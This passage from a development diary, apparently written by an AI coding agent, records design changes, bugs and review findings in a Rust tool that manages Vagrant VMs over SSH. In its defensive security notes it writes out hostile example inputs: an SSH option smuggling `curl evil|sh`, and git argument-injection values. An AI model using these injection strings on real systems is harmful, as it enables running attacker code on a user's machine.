stacked, left by an earlier line-range edit. Rust concatenates
consecutive `///` blocks without complaint, so it had been
rendering as one paragraph that repeated itself, and no gate
notices. Worth knowing for the next `sed` range: a duplicated
doc block compiles, formats and passes clippy.

And `remote_root`'s depth rule was stated three ways. The
constant said one segment, the error message said "at least 1
directory deep" -- which is ungrammatical and reads as a
constraint on the wrong thing -- and `docs/architecture.md`
said "several". The message now names what the rule actually
requires, a directory *below* the root, and a test asserts the
whole sentence so the three cannot drift again. That is the
canon rule about a prose rule needing a test with the same
example, applied to an error string.

**`~vms` looked anchored and resolved relatively**

The review of the split found a member of the `remote_root`
family the guard let through, and it is worth writing down
because the two halves were each correct on their own.

`root::check` accepted any value starting with `~`, on the
reasoning that `~` is a root. `quote_remote_path` leaves the
tilde outside the quotes only for `~` and `~/`, because those
are the spellings it knows the shell expands. So `~vms` passed
the anchoring rule and was then emitted fully quoted, which
makes it an ordinary relative name resolved against the SSH
login directory -- exactly the outcome the anchoring rule's own
message says it prevents.

The damage was bounded: `~vms` under `$HOME` is still two
segments deep, so the depth guarantee held by accident. But it
was measured against the wrong root, and a later change to
`quote_remote_path` that expanded a bare `~name` would have
turned it into another user's home directory.

The rule now requires `/` or `~/`, or exactly `~`. The lesson
is the ordinary one about a guard that spans two files: the
check and the quoter each had a defensible idea of what "a
root" meant, and neither file said the two had to agree.

**Two more prose rules, both from a reader who was not us**

The operator caught two shapes in one sitting. "Two types, and
the split is the point." is a noun phrase with the verb
removed, and "is the point" says something matters without
saying what. "the file's own contents are not bombyx's to
print" packs a possessive and an infinitive into an idiom the
reader has to unpack. Both are now in `CLAUDE.md`, with the
plain rewrite beside them, and we swept the tree for each --
six instances of the first, two of the second.

The pattern behind both is the same one the "parse a sentence
twice" rule already covers: terseness measured in words rather
than in decoding cost. Neither sentence was long.

### 2026-08-30

**bombyx writes the Vagrantfile now**

The Vagrantfile used to come from the project, and that put the
trust boundary out of reach. Vagrant reads the file before the VM
exists, so a project-supplied one has to sit on some machine
outside the guest. `docs/trust-boundary.md` decided the guest is
the only machine allowed to hold project source. The file
therefore cannot come from the project at all: bombyx renders it
from `[vm]` in `bombyx.toml` and writes it on the host after the
push, and the guest clones the project itself.

Two files go over, not one, and that came from operator review.
The first design put the provisioning script inline as a Ruby
heredoc, so config values crossed three nested contexts: Ruby, a
shell inside Ruby, and a shell on the VM host. Vagrant's shell
provisioner takes `path:` and `env:`, so the script became a
separate file that never varies. It ships verbatim through
`include_str!`, and `repo`, `ref` and `script` reach the guest as
environment variables Vagrant sets. One quoting layer went away,
and it was the dangerous one.

The second correction came from the dry run. `up` builds seven
commands now, two of which carry a whole file, so `--dry-run`
printed about seventy lines in which a payload line could not be
told from the next command. Separating on blank lines would not
have helped, because both payloads contain blank lines. Each
write prints as one line now, naming the heredoc and how many
lines it dropped. `remote::abbreviated` does that, in the library
rather than in `src/bin/`, which the coverage gate cannot see.

What is verified and what is not. Vagrant 2.4.9 with
vagrant-libvirt 0.12.2 turned out to be installed on this
workstation, the same versions frosti runs, so `vagrant validate`
parses the generated file. That is kept as an `#[ignore]`-tagged
test. `shellcheck` reports `bootstrap.sh` clean. This has never run
against frosti, so two things stay unknown: whether the host
accepts the heredoc write, and whether the guest can reach the
git host.

The review round caught the thing that mattered. The generated
Vagrantfile left Vagrant's default share on, so the guest
mounted the workstation's pushed copy of the project -- the copy
the whole design exists to keep out of it, and on a firewalled
host a mount that hangs rather than failing. The tutorial had
taught disabling it, in the very file bombyx now overwrites. So
the change did not do what it was for, and no test noticed
because no test asked.

Two more of the same shape. Overwriting the project's
Vagrantfile also broke the hand-over of `BOMBYX_VM_HOST` into
the guest, which that file used to perform and which the README
still described. And `check_renderable` guarded the Ruby literal
while the same three fields reached `git` argv and a path run as
root in the guest -- `ref = "--upload-pack=..."` read as an
option, `repo = "ext::sh -c ..."` running a command instead of
cloning. `vagrant_dir` and `remote_root` had carried those rules
for weeks. That is the "guard one field, check its siblings"
rule, missed again, on the commit that quoted it in its own
plan.

The doctor probe kept its failing branch after all. It used to
fail on a missing Vagrantfile, which caught a typo in
`vagrant_dir`; an absent Vagrantfile is ordinary now, so it
fails on a missing *directory* instead -- the same typo, one
step earlier.

### 2026-08-18

**Output that walked off the right edge of the screen**

`bombyx status` and `bombyx doctor` rendered as a staircase on a
Windows console: each line beginning at the column where the
previous one ended, and splitting mid-token once it hit the right
margin. The geometry proved the cause by itself -- from the
operator's own paste, line lengths 23, 66, 130 and leading indents
0, 23, 66. Every line started exactly where the last one stopped,
which is a missing carriage return and nothing else.

Two candidate explanations went in before the evidence did, and
both were wrong. Colour codes: ruled out, zero `0x1b` bytes in
either capture. A hardcoded `LINE_WIDTH: usize = 80` in
`doctor/report.rs` with the longest row measuring exactly 80: a
good story, and innocent -- the mid-token splits were the
terminal's own margin wrap of text that had already been pushed
rightward.

The real cause has two halves, and they need different fixes.

`status` streams the *remote's* bytes. Without a PTY the remote's
stdout is a pipe, so its tty layer never applies the `\n` to
`\r\n` translation: measured, 206 bytes with six line feeds and no
carriage returns at all. Forcing a PTY with `ssh -tt` against the
same host returned 220 bytes with six CRs and six LFs, perfectly
paired. That is the fix, and it is now `remote::Tty`, threaded
through `plan` so a dry run prints the argv the live run uses.
Only when both stdin and stdout are terminals -- `ssh -t` needs a
local terminal to allocate against, and a pipe must keep the bytes
the remote wrote. Worth knowing: under a PTY vagrant also
colourizes, which is the other 8 bytes of that difference (two
`ESC[0m` resets). Gating on both streams is what keeps those codes
out of a captured log.

`doctor`'s table is rendered by bombyx itself, so a PTY cannot
explain it -- and yet it staircased. The correlation says why:
every command that staircases runs `ssh` first, and `self-update`,
which never does, prints cleanly. The leading explanation is that
`ssh.exe` leaves a console-mode bit set that suppresses the
implicit carriage return -- `DISABLE_NEWLINE_AUTO_RETURN` is the
bit with that effect -- after which a bare LF is a pure line feed
and
*bombyx's own later writes* staircase. That cause remains
unverified -- a redirected stdout cannot reproduce a console mode
change, so it needs the operator's terminal to confirm.

The fix for that half deliberately does not live in the library.
`Report::render` keeps emitting `\n`, and the binary's
`print_lines` adds the CR when stdout is a Windows terminal. A
renderer that emitted `\r\n` on Windows would need two expected
strings per test, and this project has already shipped one test
that passed on Windows alone. `SetConsoleMode` would be the
precise instrument and is unavailable: production crates are
`#[forbid(unsafe_code)]`, with the scoped exception only for
`xtask`.

**The review found seven things wrong with that, and two were
defects rather than opinions.**

`eprint_lines` chose stderr's line endings by reading **stdout**.
Wrong in both directions, and each is a real invocation:
`bombyx up > out.log` left the failure line -- the one my own doc
comment called the line an operator most needs to read -- bare on
the terminal, and `bombyx up 2> err.log` wrote carriage returns
into a captured log the change promises not to touch. The
predicate is per-stream now.

`destroy` and `discard` never got a `Tty` at all.
`destroy_vm_if_present` builds its own argv, so teardown -- the
destructive pair, whose output you most want to read -- still
staircased. That is `CLAUDE.md`'s "guarding one field? check its
siblings", and it was invisible because the test I wrote to pin
the threading asserted only that `tar` and `scp` lack `-t`, which
their literal argv always did. It could never fail. It now
classifies every action, so a new one is a decision rather than an
omission.

Three claims were wrong rather than broken. I named
`ENABLE_VIRTUAL_TERMINAL_PROCESSING` as the mechanism; the bit
that actually suppresses the console's implicit carriage return is
`DISABLE_NEWLINE_AUTO_RETURN`, so I had published a specific,
checkable, probably-false claim while the real hypothesis was
right. The diary hedged the cause and the doc comment and CHANGELOG
did not, which is backwards -- the doc comment is the copy a
reader trusts. And `plan`'s doc promised a dry run prints the argv
the live run uses, which is false exactly where dry runs get used:
`--dry-run | grep` has a piped stdout, so it prints the plan
without `-t` while the live run in that terminal uses it.

Two consequences of `-t` needed measuring rather than assuming,
and both changed the code. Without a local terminal ssh prints
`Pseudo-terminal will not be allocated because stdin is not a
terminal.` and allocates nothing -- which is why the gate checks
stdin, now with evidence. And a tty session makes ssh print
`Connection to <host> closed.` on stderr, so every `status` and
`up` would have gained a spurious trailing line. `-o
LogLevel=ERROR` suppresses it; measured that a genuine failure
still reports identically, an unresolvable host giving the same
message and the same 255 either way. `QUIET` also works and was
rejected for swallowing real diagnostics.

`Tty::Allocate` is now Windows-only. On Unix a terminal needs no
translation, so it bought nothing by its own stated rationale
while still folding the remote's stderr into stdout -- meaning
`bombyx up 2> err.log` would have captured nothing from the
remote on Linux. Those platforms keep the behaviour they had.

The pure halves moved into `bombyx::term` and
`Tty::for_streams`, which is where they should have gone first:
`src/bin/` is outside the coverage gate, and I had put the entire
second half of the fix -- a string substitution and a
two-boolean rule -- somewhere no test could reach, in the same
session whose last two commits were about exactly that. Writing
`line_endings`'s tests immediately found a third defect nobody had
reported: `replace('\n', "\r\n")` turns existing CRLF into
`\r\r\n`, a blank row between every line. Nothing feeds it CRLF
today, but the failure line embeds a remote script built from
`bombyx.toml` values, and none of those is checked for control
characters. It is idempotent now.

Scope, stated rather than uniform: the messages that go through
the new writers are the ones printed *after* a child -- doctor's
table, `execute`'s failure line, and the top-level error printer,
which the first cut missed and which is the worst omission of the
three because `{err:#}` is routinely multi-line.

One thing this cost an hour to notice: `cargo xtask test` reported
`Test OK` against a **stale build** while I was iterating, so a
test that should have failed passed twice. The tell was 0.05s with
no compile line. A `touch` fixed it; not trusting a green run that
did not recompile is the lesson.

**The first real self-update, and the one bug it printed**

`bombyx self-update` ran end to end for the first time: an installed
`0.3.0` replaced by the published `0.4.0` on Windows 11. Tag discovery,
the per-platform URL, the checksum against the release's `SHA256SUMS`,
extraction, the rename-aside dance and the sweep of an earlier leftover
all worked in one invocation. The README's `(unverified)` note on that
section, and a later sentence saying the update as a whole had not been
measured, are both replaced with the run's own output.

That note mattered more than it looks. An unverified marker left in
place *after* verification is worse than never having written one,
because it teaches the reader to skip them -- and this project puts a
lot of weight on those markers. Two remain in the section and are
honest: no update has been run on Linux or macOS, and the release
workflow's refusal to replace a published version's assets needs a
re-pushed tag to reach.

The run printed one defect: `removed 1 superseded binaries`. Trivial
in isolation, and the interesting part is where it was written -- in
`src/bin/bombyx/main.rs`, which the coverage gate cannot see, so no
test could have caught it. That is the third thing this session to go
wrong in that file for the same reason, after the update decision's
three operator sentences and a digest comparison. So the notice moved
into the library as `Placed::sweep_notice`, beside the count it
describes, with a test over zero, one and many. The pattern is now
established well enough to state plainly: prose that names a number
belongs next to the number.

**The review then pointed out I had fixed half of it.** `Placed` has
two fields and reports both; the leftover sentence was still composed
by hand three lines below the call that had just been moved out, with
the same properties that justified moving it -- operator prose, a
`Some`/`None` branch, no test. A reader would have seen one field
reported through a tested library method and its neighbour done
inline, with no rule between them. `Placed::leftover_notice` now sits
beside `sweep_notice`, both tested, and the call site is one loop over
the two. That is the "after fixing a bug, grep the file for the same
shape" rule in `CLAUDE.md`, and this is the second time today I have
needed a reviewer to apply it for me.

Prompted by the repeat, I enumerated all thirteen `println!` and
`eprintln!` calls left in that file rather than waiting for a fifth
commit against it. Only the one fixed carried a count; the rest are
error passthrough, two-path notices, dry-run argv echoes, or already
library-sourced. So the plural class is closed rather than merely
patched at the site that happened to be seen.

One convention worth writing down, since a third message will
eventually be added. `sweep_notice` and `leftover_notice` return the
sentence *without* the `bombyx: ` prefix and the caller adds it, while
`Outcome`'s strings spell the program name themselves -- because
there it is part of the sentence ("bombyx 0.4.0 is the newest
release") rather than a log prefix. Both are now documented, because
picking the wrong one produces `bombyx: bombyx 0.4.0 is ...`, which
no test would show and only a real run would.

Also worth recording: the leftover `bombyx.exe.old-41780-606660100`
behaved exactly as the README describes -- held by the process doing
the updating, so undeletable until the next update replaces the
binary. And the wording *for that* leftover was already correct in the
shipped 0.4.0 code; the message the operator saw came from the 0.3.0
binary, which is the one running while an update happens.

That last fact bit the README twice. A self-update always reports the
old version's sentences, so "verified end to end" over a commit that
*changes* one of those sentences overstates by a hair -- the run
verified `0.3.0`'s copy of the path, and the two corrected sentences
have still never run against a real release. And my first draft of
that section quoted the run as three lines when it printed five,
having quietly dropped the two defective ones. Trimming the evidence
to the parts that look good, in the very section whose value is
calibrated confidence. The block is now verbatim, defects included,
with the reason they are there.

**A config file that read out a private key, and a tag that could
redefine a version**

The last two red-team items, both of which had been deferred as
design decisions rather than as work.

`toml::de::Error`'s `Display` quotes the offending source line into
its message, and bombyx printed that to stderr:

```
bombyx: loading bombyx.toml: invalid config in bombyx.toml:
TOML parse error at line 1, column 12
  |
1 | -----BEGIN OPENSSH PRIVATE KEY-----
```

Reproduced against the built binary, then again after the fix,
which now prints "line 1, column 12: key with no value, expected
an equals". The position and the reason are what let someone
correct a malformed config; the file's own bytes are not
bombyx's to print. The overlay path already refused a symlink,
but the base `bombyx.toml` did not, and nobody inspects a
config after a clone.

The deferral said this "trades away the diagnostic that makes a
malformed config easy to correct". It does not, because
`toml::de::Error` exposes `message()` and `span()` separately -- the
reason without the snippet, and a byte range. Turning the range
into a line and column needs the source, which is why
`toml_summary` takes it and why nothing it returns comes from it.
The column counts characters rather than bytes, so a non-ASCII
line does not report a position past where the operator sees the
problem.

The other one was about release idempotency. `gh release upload
--clobber` on a re-pushed tag means a published version's bytes can
change, and nothing downstream can tell: `update::decide` compares
only `MAJOR.MINOR.PATCH`, so whoever installed the old bytes is
reported up to date forever, and whoever is mid-download gets a
checksum mismatch whose message blames tampering.

Idempotency was added for a real reason -- a history rewrite moved
both tags and the release job failed on an otherwise green build --
so removing it outright would reintroduce that. The distinction it
was missing is between repairing an incomplete release and
redefining a complete one, and `SHA256SUMS` marks the difference:
it is uploaded with the assets, so its presence means a previous
run reached the end. A release without it can still be re-run; one
with it fails and asks for a new patch tag, with
`ALLOW_RELEASE_REPLACE=true` as a deliberate override. The
version-comparison limit is in `README.md` as well, since the
override exists.

That empties both backlogs. Two of the twelve items closed today
were not defects but standing decisions -- keep `plan.rs`'s
duplicated push expectations, keep `doctor/readonly.rs` whole --
and those moved into comments beside the code they govern, which is
where a decision belongs. A "deferred backlog" is the wrong place
to file something nobody intends to do.

**Two reads of one archive, and a type that made an unreachable
branch necessary**

`self-update` verified the downloaded archive by hashing
`std::fs::read(&archive_path)`, then handed the same *path* to
`tar`. Two reads, nothing pinning the file between them -- so
`bombyx: <archive> matches its published checksum` was printed
about bytes that need not be the bytes extracted.

What landed re-checks the archive after extraction and refuses
*before* `place` installs anything. The first version of that
change, and the CHANGELOG bullet with it, said it "detects" a
swap. The review pointed out two shapes it does not: a writer who
restores the original bytes before the second read, and -- easier,
needing no timing at all -- a writer who leaves the archive alone
and overwrites the *extracted binary* after `tar` exits.

The useful part of the review was not the two holes but the
question of whether they matter. `tempfile::TempDir` is mode
`0o700` on Unix and per-user on Windows, so any such writer is
already the same user or root, and that writer can overwrite
`~/.cargo/bin/bombyx` directly. Racing self-update wins them
nothing they did not have. So the check stays -- one read, and it
covers the ordinary accident and the unreverted swap -- and the
wording was corrected everywhere to claim exactly that. Closing
it properly needs the release to publish a digest of the *binary*,
not only of the archive.

It also moved into the library as `asset::confirm_unchanged`,
calling the already-tested `asset::verify` a second time rather
than comparing a digest by hand, with three tests. It had been
written in `src/bin/`, where the coverage gate does not reach --
so a security comparison sat in the one place an inverted `==`
would fail nothing. The same diff's own diary entry gave that
argument for moving the decision sentences out; the review noticed
it had not been applied to the new code.

Three structural findings from the same review round, all closed
here:

`action_of` carried a `Cmd::SelfUpdate => bail!("internal error:
...")` arm that could not be reached, kept unreachable by a
`matches!` four hundred lines away. An invariant maintained by a
comment. `enum Cmd { SelfUpdate, #[command(flatten)] Vm(VmCmd) }`
makes it total, and the arm and the sentinel both delete. The
invocation surface is unchanged -- `bombyx up`, not `bombyx vm
up` -- though `--help` now lists `self-update` first, since a
flattened variant contributes its subcommands at its own
position. The dispatch is an exhaustive `match` rather than the
`let ... else` it was first written as: the whole point is that a
third config-less subcommand fails to compile instead of being
routed silently into `self_update`.

`execute` returned `Result<ExitCode>` as its domain answer, so
`ran_ok` asked "did it work" with `== ExitCode::SUCCESS`, leaning
on a `PartialEq` that opaque type does not exist to provide. It
returns a `Ran` now, carrying a raw status byte rather than an
`ExitCode` -- the first attempt kept the `ExitCode` inside, which
left `Ran` uncomparable and the conversion still happening in two
places inside `run` while its doc claimed otherwise. `run` and
`self_update` return `Ran` too, so the single `ExitCode::from` is
in `main`.

And `update.rs` was past 900 lines holding four concerns. Split by
*effect*, which is the distinction worth having: `update/version.rs`
is pure, `update/swap.rs` renames and deletes the installed binary,
and `update.rs` keeps the argv builders and re-exports both, so no
caller path changed. The doc gate caught the one mistake in the
move immediately -- a public module doc linking to the now-private
submodules.

The wording of the three no-op decisions moved into the library
with them, as `Decision::outcome`. `src/bin/` is outside the
coverage gate, so those sentences had no test at all; getting
`Ahead`'s two versions the wrong way round tells a developer their
fresh build is out of date, and nothing would have said so.

**The attribution file was attributing the wrong crates**

`cargo xtask licenses` landed listing 87 crates and calling them
the binary's dependencies. Three of those words were wrong at
once. `cargo metadata` with no pruning walks dev-dependencies, so
`assert_cmd`, `predicates` and `difflib` were in there; it walks
every workspace member, so `xtask`'s own `clap` and `serde_json`
were too; and without `--filter-platform` it walks every target,
which is how `r-efi` -- a UEFI crate -- came to be attributed on
Windows. The fix walks `resolve.nodes` from members whose
`publish` field is not an empty array, following only `dep_kinds`
entries with `kind: null`, and passes `--filter-platform` plus
`--locked`. The count went 87 to 50 for
`x86_64-pc-windows-msvc`, and the release workflow now generates
the file per target so each archive carries its own platform's
set.

The `--locked` is the non-obvious one. Without it this call can
re-resolve and rewrite `Cargo.lock` *after* the
`cargo build --locked` that produced the binary, so the file
would describe a set the binary never used.

**Then the review found the sentence still was not true, and the
example it leaned on was the worst case of it.** Two things are
in the list without being linked into anything. Proc-macro crates
run at compile time -- and `unicode-ident`, whose `Unicode-3.0`
obligation was being quoted in three places as the reason this
file exists, reaches bombyx only through `clap_derive`,
`serde_derive` and `thiserror-impl`. `cargo tree -i unicode-ident
-e normal` shows every path going through a `(proc-macro)` crate.
The flagship justification was for a crate that is not in the
binary. Separately, `resolve.nodes[].deps` reports an optional
dependency the build never enables with the same `kind: null` as
a real edge, which is how `indexmap`, `hashbrown` and
`equivalent` arrive behind `toml`'s disabled `preserve_order`
feature: `cargo tree -e normal` gives 47 crates where the walk
gives 50.

Pruning those two needs feature resolution and proc-macro role
detection, both of which fail quietly and in the direction that
matters -- an omitted notice. So the set stays over-inclusive and
the *wording* was fixed instead, everywhere: "goes into building
this binary", never "is linked into" it. An unnecessary
attribution costs nothing. A false sentence in a legal document
is the thing being avoided, and it had been written three times.

The other half was the failure mode. A crate with no licence text
used to be named in the file and the command exited 0. That reads
as thorough and is the opposite: if the registry sources are
absent -- a vendored build, or a container where `CARGO_HOME`
differs between build and packaging -- every crate comes back
text-less, and the tool writes a short file announcing that none
of them ship a licence, exits 0, and that ships. It now fails,
with `--max-missing N` to raise the bar on purpose.

Two follow-ons there. The gate's predicate had to be narrower
than the collector's: `NOTICE`, `AUTHORS` and `COPYRIGHT` are
gathered because they carry obligations, but a crate shipping only
an `AUTHORS` contributor list, or an empty `LICENSE`, has given us
no terms to reproduce -- and either used to pass. And the gate now
runs in every-push CI, not only in the release matrix. A gate
whose first firing is minutes into a tagged build costs a moved
tag, which this project has already paid for once.

**`self-update`, and three assumptions that did not survive
contact**

bombyx now updates itself: `git ls-remote --tags` finds the
newest release, `curl` fetches that platform's `.tar.gz` and the
release's `SHA256SUMS`, the digest is checked, and `tar` extracts
the binary over the installed one. Verification fails closed --
no checksum, no entry, or a mismatch all refuse, and there is no
flag to skip it.

The design changed three times, each time because something got
measured rather than reasoned about.

**It started as `cargo install --git --tag`.** No new
dependencies, and every bombyx user has a toolchain because
installing it is `cargo install`. That was the plan until it was
pointed out that the release already publishes binaries for four
platforms, so requiring a compiler to consume them is absurd.

**The download version then died on repository visibility.**
`breki/bombyx` is private, so the plain
`releases/download/...` URL returns 404 -- asset downloads need a
token and the API endpoint. The `cargo install` path had been
working the whole time precisely because git uses the credential
helper. The lesson is the cheap one: `gh repo view --json
visibility` would have settled it before any code was written.
The repo is being made public, which is what makes the download
path viable at all.

**And Windows will not overwrite a running executable.** The
first install attempt failed with `Access is denied (os error 5)`
on the *move*, not the build -- a four-day-old `bombyx shell` was
holding `~/.cargo/bin/bombyx.exe`. This is not an edge case:
`bombyx self-update` is itself a running bombyx, the same file
being replaced. Windows does permit *renaming* a running binary,
and the running process keeps working from the renamed file, so
the update moves the old one aside, extracts, and sweeps the
leftover on the next run. Both halves were measured before the
code was written.

Three things are verified by measurement rather than assertion:
SHA-256 against the specification's own `abc` and empty-string
vectors; the `tar --strip-components=1 <stem>/<binary>` argv
against a release-shaped archive, which extracts the binary alone
and leaves `LICENSE` behind; and `curl -f`, which exits 22 and
writes **nothing**, where the same command without `-f` exits
zero having saved a nine-byte `Not Found` as the asset. That last
one was a real bug earlier the same day, so the flag is a fix
rather than a habit.

What is not verified: the update end to end. It needs the repo
public *and* a release cut after this commit, because `v0.2.0`
has neither a `SHA256SUMS` nor a Windows `.tar.gz`. Run against
`v0.2.0` today it correctly refuses and prints the manual
`cargo install` line.

**A test that passed on one platform, and the bug behind it**

`v0.3.0` was tagged and its release run failed -- not in the new
workflow steps, but in `ci / Test` on ubuntu and macos while
Windows passed. The cause was mine and it is worth naming.

`install_dir_accepts_userprofile_on_a_bare_windows_shell` built its
expected value as `Path::new(r"C:\Users\igor\.cargo").join("bin")`.
A backslash is not a path separator on Unix, so that string is a
*single* component there, while the implementation joins `.cargo`
onto the home directory and produces two. Windows normalises and
compares component-wise, so the two matched there and only there.
Every expectation is now built with the same joins the code uses,
behind a `cargo_bin` helper so the shape has one place to live.

Review then found the real defect underneath. `install_dir_from`
resolved `HOME` before `USERPROFILE`, and Git Bash sets *both*,
with `HOME` in POSIX form (`/c/Users/igor`). That value satisfies
`is_anchored_dir`, and Windows resolves a `/`-rooted path against
the *current drive* -- so from `D:\src\bombyx` it would mean
`D:\c\Users\igor\.cargo\bin`. In practice MSYS converts `HOME` for
native children, so a binary launched from that shell usually sees
the Windows spelling; nothing guarantees it. `USERPROFILE` now wins
on Windows and `HOME` is not consulted at all elsewhere, which is
exactly what `config_dir_from` already does with `APPDATA` and for
the same two reasons: the POSIX-form value, and `WSLENV` exporting
Windows variables into Linux processes.

No test had set both variables, so reversing the order would have
kept the whole group green. That test exists now.

The other half of the lesson is the one to remember. The doc
comment asserted "Windows usually sets USERPROFILE and not HOME",
which is false on the shell this repo is developed in, and a
five-second `echo $HOME` would have said so. Three separate
findings this week have had the same shape: a claim about the
environment written from expectation rather than measurement.

**Releases now audit twice**

`cargo xtask audit` runs in the release workflow's `gates` job
and as its own step in `/release`. Two copies, because they stop
different things: the local one blocks the tag from being
created, and the CI one blocks the binaries from being published.

The reason it is a *separate* step rather than left to `validate`
is a detail worth writing down. Inside `validate`, a missing
`cargo-audit` or an unreachable advisory DB degrades to a printed
warning so an offline laptop is not blocked -- which means
`Validate OK` does not imply the dependencies were audited. The
standalone command errors on both. For everyday work the lenient
reading is right; for a release it is not.

`dep-age-check` was deliberately left out of the release job. It
compares the working tree against `HEAD`, and at a tag the
lockfile is unchanged, so it would be a guaranteed no-op -- a
step that looks like a gate and checks nothing. The cooldown
belongs where a dependency is adopted.

The workflow also learned to be idempotent. Force-pushing the
rewritten tags earlier the same day re-triggered it for both, and
`gh release create` failed with "a release with the same tag name
already exists" on an otherwise green build. A re-pushed tag is a
legitimate event, so it now updates an existing release in place.

### 2026-08-17

**The guest learns which machine it is running on**

An agent working inside a bombyx VM could not answer "where is
this actually running". Nothing in the guest knows: there is no
synced folder, `hostname` in the VM reports the guest's own name,
and libvirt does not pass the host's name in at all: the guest's
DMI describes the *emulated* machine, so `sys_vendor` reads
`QEMU`. Measured inside a live guest as the unprivileged user --
those files are readable and hold nothing about the host, and the
root-only ones carry no host name either, so there is nothing to
read at any privilege level. The first draft of this reasoning
said the fields were root-only, which was wrong on both halves
and was caught in review before it shipped.

With one VM host that is a curiosity. With two -- a
WSL2 distribution on the workstation and a real machine in the
next room -- a status line that cannot say which one is answering
is a status line that will eventually mislead.

So `remote::vagrant_script` now prefixes every `vagrant`
invocation with `BOMBYX_VM_HOST` (the SSH alias, which is the
name the operator chose and therefore recognises) and
`BOMBYX_VM_HOSTNAME` (`$(hostname -s)`, what the machine calls
itself). Both, because an alias in `~/.ssh/config` need not match
the machine's own name and often does not.

The prefix goes on *every* invocation rather than only the ones
that provision. `halt` and `status` have no use for it. The
alternative was a per-action list, and a per-action list is a
list that goes stale: the action that next needs the values is
whichever one grows a provisioner, and it would be the one nobody
remembered to add.

**The `$(hostname -s)` is the interesting part.** It has to be
evaluated by the *host's* shell, so it is deliberately left
unexpanded in the script bombyx builds. This is the wrong-side
expansion trap `CLAUDE.md` already records, and it fails
politely: expanded on the workstation it reports a real hostname,
just the wrong machine's, which is exactly the kind of answer
nobody questions. The live check was therefore built to make a
wrong side visible -- the host reported `bombyx-host` while the
workstation is `PERUN`, two values that cannot be confused.

**And one assumption that was simply wrong.** The first draft of
the README said Vagrant forwards its own environment to a shell
provisioner, so a line in `provision.sh` would be enough. It does
not. A provisioner runs *inside* the guest, under the guest's
environment; anything from the host has to be handed over
deliberately through the provisioner's `env:` option. A
throwaway `Vagrantfile` on the host settled it in one command --
it printed both values with the prefix and `MISSING` for both
without it. The guest-side recipe is consequently two steps, not
one, and the docs now say which half does what. Worth noting how
the error would have surfaced otherwise: the documented recipe
would have produced an empty file in every VM, and the natural
suspicion would have fallen on bombyx's quoting rather than on a
sentence about Vagrant nobody had checked.

### 2026-08-16

**CI and a release workflow, and one bug not copied across**

bombyx had no `.github` directory at all: no CI, no releases, and
the only way to install it was `cargo install` with a Rust
toolchain to hand. Both workflows are modelled on kozmotic's,
which is the sibling project that already does this.

Three things were changed rather than copied.

The release-notes step in kozmotic's workflow accepts
`[Unreleased]` as a fallback when it cannot find the version's
section. `[Unreleased]` is the first heading in the file, so it
always matches before the version section is reached, and
`/release` has just emptied it -- kozmotic's `v1.2.0` shipped
with empty notes for exactly this reason. Here the version
heading is matched by exact prefix and a missing section
**fails** the release rather than publishing silence.

CI runs `cargo xtask test` and `cargo xtask clippy` rather than
the raw cargo commands, because `CLAUDE.md` requires it and CI
that used a different entry point would drift from what a
developer runs. `fmt` is the exception: `cargo xtask fmt`
rewrites in place, so in CI it would pass on a tree it had just
fixed, and the read-only `cargo fmt --all -- --check` is used
instead.

Coverage and duplication run on the release path only, in a
`gates` job that `build` depends on, so no binary is produced
until they pass. They are kept out of every-push CI because each
needs a tool the runner does not ship. `audit` and
`dep-age-check` stay local: both reach the network for state
that changes on its own, so in CI they fail for reasons
unrelated to the commit being released. Six of `validate`'s
eight gates therefore run somewhere nobody can skip; the two
network-dependent ones still rely on `/release` running
`validate` before it tags.

### 2026-08-13

**The VM host left `bombyx.toml` entirely**

Two days ago the answer to "a committed config cannot name
everyone's VM host" was an overlay file: keep `host` in
`bombyx.toml`, let `bombyx.local.toml` replace it. That was half
a fix. The committed default still existed, still named one
person's machine, and still applied to anyone who did not know
to write the override -- and the thing it aims is `destroy`,
which runs `vagrant destroy` and `rm -rf` on whatever host wins.
A default that is wrong for everyone but its author is not a
default.

So `host` is gone from the project file and a key there is now a
hard error rather than a warning. Ignoring it was the other
option and it is worse: the key stays in the repo, the warning
gets tuned out, and the next reader cannot tell whether the
value is in force. An error is read once and fixed once.

The value now comes from four sources, first match winning:
`--host`, `BOMBYX_HOST`, `bombyx.local.toml`, then a
per-developer `config.toml` under `%APPDATA%\bombyx` or
`$XDG_CONFIG_HOME`/`$HOME/.config`. The usual case is the last
one -- write it once, every project uses it.

Three things are worth recording because they are not obvious
from the diff:

`Config::load` takes a `HostSources` struct rather than reading
the environment itself, and `config_dir_from` takes a closure
over environment lookups. Both exist so precedence is unit-
testable without mutating the process environment, which is
global and would make the tests race each other. The binary is
the only thing that touches `std::env`.

`with_overlay` deliberately stops applying `host`. The resolver
has already ranked the overlay's value against the flag and the
environment, both of which outrank it; re-applying it during the
merge would silently promote the file above both. There is a
test pinning that seam, because a comment does not fail.

The integration tests now set `BOMBYX_CONFIG_HOME` at a fixture
directory and clear `BOMBYX_HOST`. Without that, every assertion
would read the developer's own config -- green on this machine,
red on the next.

**The security rationale had to be rewritten, not copied**

The `host` charset check existed because `bombyx.toml` travels
inside a repo: `host = "-oProxyCommand=curl evil|sh"` is read by
`ssh` as an option, so a clone could run code on the workstation
from a bare `bombyx status`. That specific path is now closed by
construction -- the field is refused in the file.

The check stays, because the remaining sources can still be
wrong: a local file, a per-developer file, an env var, a
mistyped flag. But every place that explained it in terms of a
hostile repo was now overclaiming, so the prose says it guards
the argv rather than one particular file. This is the
"after removing a capability, re-grep for it" rule paying off; a
plain `grep` for `host` found stale claims in `.gitignore`, the
architect skill, two doc comments and the CHANGELOG.

**A notice that lied about which host was in force**

Caught by running the thing rather than by a test. With a
`bombyx.local.toml` present, bombyx printed
`bombyx.local.toml overrides bombyx.toml` -- true, and read as
"the host in that file is in force" even when `--host` had
outranked it. Since teardown deletes a directory on the winner,
bombyx now also prints `host <name> from --host` /
`from BOMBYX_HOST` when the value came from outside both files.

**`cargo xtask check` was not checking the tests**

Noticed while changing `Config::load`'s signature: `check`
reported `Check OK`, and `cargo xtask test` then produced five
`E0061` errors in the test targets. `cargo check --workspace`
without `--all-targets` does not compile tests, benches or
examples -- so the gate advertised as the fast type-check was
blind to exactly the code a signature change breaks, and the
breakage surfaced only from the slower step.

It now passes `--all-targets`, verified by reintroducing the
same breakage in a test call site and watching `check` fail on
it. The cost is a slightly slower `check`; the alternative is a
gate that reports success on the class of change it is most
often run for.

**The docs grew a tutorial, and the README shrank**

`docs/usage.md` took the command reference out of the README
(350 lines down to ~200), and `docs/tutorial.md` is a new
end-to-end walkthrough: workstation, VM host, sample project
with a Vagrantfile and a provisioning script, first boot, daily
